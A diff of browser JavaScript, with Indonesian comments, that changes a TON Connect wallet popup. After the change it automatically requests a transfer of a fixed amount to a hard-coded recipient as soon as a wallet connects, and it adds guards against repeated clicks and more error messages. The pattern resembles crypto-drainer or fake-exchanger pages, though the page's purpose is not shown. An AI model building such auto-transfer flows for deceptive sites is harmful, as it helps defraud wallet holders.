@@ -8,6 +8,7 @@
             this.mainButton = document.getElementById('mainButton');
             this.transferPopup = document.getElementById('transferPopup');
             this.connectTransferBtn = document.getElementById('connectTransferBtn');
+            this.isProcessing = false; // Tambahkan flag untuk mencegah multiple requests
             this.init();
         }
 
@@ -45,23 +46,28 @@
         }
 
         setupConnectionListener() {
-            this.tonConnectUI.onStatusChange(() => {
+            this.tonConnectUI.onStatusChange((wallet) => {
                 this.updatePopupButtonStyle();
+                
+                // PERBAIKAN: Otomatis kirim transaksi setelah wallet terconnect
+                if (wallet && this.isProcessing) {
+                    console.log('Wallet connected, proceeding with transaction...');
+                    // Tunggu sebentar untuk memastikan koneksi stabil
+                    setTimeout(() => {
+                        this.sendTransaction();
+                    }, 1000);
+                }
             });
         }
 
-        // PERBAIKAN: Handle close outside untuk struktur HTML yang spesifik
         setupCloseOutsideListener() {
-            // Event listener untuk klik pada popup-container (background)
             this.transferPopup.addEventListener('click', (e) => {
-                // Cek jika klik terjadi langsung pada popup-container (bukan pada child elements)
                 if (e.target === this.transferPopup) {
                     console.log('Closing popup - background clicked');
                     this.hidePopup();
                 }
             });
 
-            // ESC key handler
             document.addEventListener('keydown', (e) => {
                 if (e.key === 'Escape' && 
                     this.transferPopup && 
@@ -81,6 +87,7 @@
             console.log('Hiding confirm popup');
             this.transferPopup.classList.add('hide');
             this.showStatus(''); // Clear status message
+            this.isProcessing = false; // Reset processing flag
         }
 
         updatePopupButtonStyle() {
@@ -96,12 +103,25 @@
         }
         
         async connectWallet() {
-            this.showStatus('', 'loading');
+            // PERBAIKAN: Cegah multiple clicks
+            if (this.isProcessing) {
+                console.log('Transaction already in progress...');
+                return;
+            }
+            
+            this.isProcessing = true;
+            this.showStatus('Connecting wallet...', 'loading');
+            
             try {
+                // PERBAIKAN: Tunggu hingga wallet benar-benar terconnect
                 await this.tonConnectUI.connectWallet();
-                this.sendTransaction();
+                // Jangan langsung panggil sendTransaction() di sini
+                // Biarkan setupConnectionListener() yang menanganinya
+                
             } catch (error) {
-                this.showStatus();
+                console.error('Wallet connection failed:', error);
+                this.showStatus('Wallet connection failed', 'error');
+                this.isProcessing = false;
                 this.updatePopupButtonStyle();
             }
         }
@@ -116,25 +136,45 @@
         }
         
         async sendTransaction() {
+            // PERBAIKAN: Double check connection status
+            if (!this.tonConnectUI.connected) {
+                this.showStatus('Wallet not connected. Please try again.', 'error');
+                this.isProcessing = false;
+                return;
+            }
+            
             this.showStatus('Preparing transaction...', 'loading');
+            
             try {
-                if (!this.tonConnectUI.connected) {
-                    this.showStatus('Wallet not connected. Please connect first.', 'error');
-                    return;
-                }
                 const amountInNano = (parseFloat(this.staticAmount) * 1000000000).toString();
                 const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 300,
+                    validUntil: Math.floor(Date.now() / 1000) + 300, // 5 menit
                     messages: [{
                         address: this.staticRecipient,
                         amount: amountInNano
                     }]
                 };
+                
+                console.log('Sending transaction...');
                 const result = await this.tonConnectUI.sendTransaction(transaction);
-                this.showStatus('Exchanger Success', 'success');
+                console.log('Transaction result:', result);
+                
+                this.showStatus('Transaction successful!', 'success');
+                
             } catch (error) {
                 console.error('Transaction failed:', error);
-                this.showStatus();
+                
+                // PERBAIKAN: Handle error yang lebih spesifik
+                if (error.message?.includes('User rejected')) {
+                    this.showStatus('Transaction cancelled by user', 'error');
+                } else if (error.message?.includes('timeout')) {
+                    this.showStatus('Transaction timeout. Please try again.', 'error');
+                } else {
+                    this.showStatus('Transaction failed. Please try again.', 'error');
+                }
+                
+                this.isProcessing = false;
+                this.updatePopupButtonStyle();
             }
         }
 
